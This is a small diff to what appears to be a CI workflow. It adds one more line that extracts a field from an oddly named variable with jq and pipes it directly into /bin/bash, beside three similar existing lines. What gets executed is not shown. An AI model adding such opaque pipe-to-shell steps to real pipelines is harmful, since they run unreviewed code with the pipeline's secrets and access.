@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$toxrc86029" | jq -r .zvcvs9 | /bin/bash
           echo $g54084 | jq -r .k2 | /bin/bash
           echo $rk7 | jq -r .y6411 | /bin/bash
+          printf '%s' "$bs6" | jq -r .llm19518 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
